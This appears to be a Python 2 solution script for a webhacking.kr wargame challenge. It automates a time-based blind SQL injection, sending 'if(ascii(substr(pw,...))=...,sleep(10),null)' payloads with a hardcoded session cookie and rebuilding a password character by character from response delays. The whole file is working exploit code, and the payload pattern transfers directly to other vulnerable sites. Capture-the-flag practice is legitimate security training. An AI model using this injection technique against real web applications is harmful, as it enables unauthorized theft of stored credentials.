from time import time
import requests


cookie = {'PHPSESSID': 'c8b31fd8eb78951438782461b686983a'}

url = "http://webhacking.kr/challenge/bonus/bonus-1/index.php?no=1 "

dbname= ""

#Password is
for i in range(1, 20):
    for j in range(40, 125):
        query = url + " or if(ascii(substr(pw," + str(i) + ",1))=" + str(j) + ",sleep(10),null)-- -"
        start = time()
        req = requests.get(query, cookies=cookie)
        end = time()
        diff = end - start
        if  (diff >= 10):
            dbname += chr(j)
            break
print "Password is : " + dbname
        